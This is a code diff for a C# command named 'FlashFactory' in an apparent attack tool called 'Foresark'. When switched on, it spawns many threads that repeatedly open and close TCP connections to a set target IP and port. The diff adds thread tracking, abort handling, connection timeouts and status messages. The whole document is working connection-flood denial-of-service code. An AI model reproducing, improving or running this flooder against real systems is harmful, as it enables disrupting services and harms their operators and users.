@@ -16,6 +16,7 @@ namespace Foresark.Commands
         };
 
         public static Boolean flashFactory;
+        public static List<Thread> activeSockets;
 
         public FlashFactory() : base() { }
         public FlashFactory(Dictionary<string, string> parameters) : base(parameters) { }
@@ -29,11 +30,19 @@ namespace Foresark.Commands
             flashFactory = !flashFactory;
             if (flashFactory)
             {
+                activeSockets = new List<Thread>();
                 for (int i = 0; i < socketPower; i++)
                 {
-                    Thread sockets = new Thread(this.doFactory);
-                    sockets.Start();
+                    Thread socket = new Thread(this.doFactory);
+                    activeSockets.Add(socket);
                 }
+                activeSockets.ForEach(s => s.Start());
+                Output.printMsg("Flash factory is now active with " + socketPower + " sockets");
+            }
+            else
+            {
+                activeSockets.ForEach(s => s.Abort());
+                Output.printMsg("Flash factory is now inactive");
             }
             return null;
         }
@@ -54,21 +63,32 @@ namespace Foresark.Commands
         public void doFactory()
         {
             TcpClient socket = new TcpClient();
+            long timeout = 0;
+            bool isConnecting = false;
             while (flashFactory)
             {
                 try
                 {
-                    socket.Connect(Foresark.targetIP, Foresark.targetPort);
+                    if (!socket.Connected && !isConnecting)
+                    {
+                        socket.Connect(Foresark.targetIP, Foresark.targetPort);
+                        isConnecting = true;
+                        timeout = System.Environment.TickCount;
+                    }
                 }
                 catch (SocketException e)
                 {
                     socket.Client.Close();
+                    socket = new TcpClient();
                 }
-                if (socket.Connected)
+                if (socket.Connected || timeout + 5000 < System.Environment.TickCount)
                 {
                     socket.Client.Close();
+                    socket = new TcpClient();
+                    isConnecting = false;
                 }
             }
+            
         }
     }
 }
